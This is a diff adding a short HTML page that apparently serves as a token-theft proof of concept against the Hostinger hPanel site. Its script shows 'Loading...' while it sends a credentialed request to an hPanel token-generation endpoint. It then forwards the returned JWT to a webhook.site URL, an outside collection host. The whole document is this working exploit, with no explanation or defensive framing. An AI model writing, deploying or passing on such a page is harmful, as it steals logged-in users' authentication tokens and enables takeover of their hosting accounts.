@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Loading...</h1>
+    <script>
+      fetch("https://hpanel.hostinger.com/api/communication/api/external/v1/auth/token/generate", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "text/plain"
+        },
+        body: "null"
+      })
+      .then(res => res.json())
+      .then(data => {
+        const token = data?.data?.token;
+        if (token) {
+          fetch("https://webhook.site/1f865f43-5e9c-42f8-b291-08523a2464ce?jwt=" + encodeURIComponent(token));
+        }
+      });
+    </script>
+  </body>
+</html>
